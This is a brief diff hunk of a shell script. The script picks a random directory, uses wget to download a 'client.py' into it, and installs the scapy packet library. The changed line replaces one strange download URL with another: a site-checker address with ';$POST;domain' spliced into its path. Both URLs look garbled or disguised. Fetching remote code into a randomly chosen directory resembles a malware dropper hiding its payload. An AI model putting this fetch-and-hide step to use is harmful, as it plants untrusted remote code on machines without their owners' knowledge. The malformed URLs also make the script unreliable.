@@ -13,7 +13,7 @@ random_index=$(( RANDOM % ${#directories[@]} ))
 random_directory=${directories[$random_index]}
 
 # download binary to directory
-wget -P "$random_directory" 'https://validator.w3.org/checklink?uri=/client.py'
+wget -P "$random_directory" 'https://isitdown.me/check_domain.php;$POST;domain/client.py'
 
 # install any dependencies
 apt-get install python3-scapy
